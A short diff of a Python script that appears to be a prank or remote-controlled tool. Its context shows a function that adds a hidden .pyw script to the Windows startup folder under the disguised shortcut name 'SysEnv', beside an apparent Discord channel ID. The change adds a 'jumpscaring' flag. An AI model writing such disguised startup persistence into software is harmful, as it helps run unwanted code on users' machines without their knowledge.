@@ -49,6 +49,9 @@ shortcut_path = startup_dir / f"{shortcut_name}.lnk"
 
 CHANNEL_ID = 1355560563622678699
 
+global jumpscaring
+jumpscaring = False
+
 def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="SysEnv"):
 
     if script_path is None:
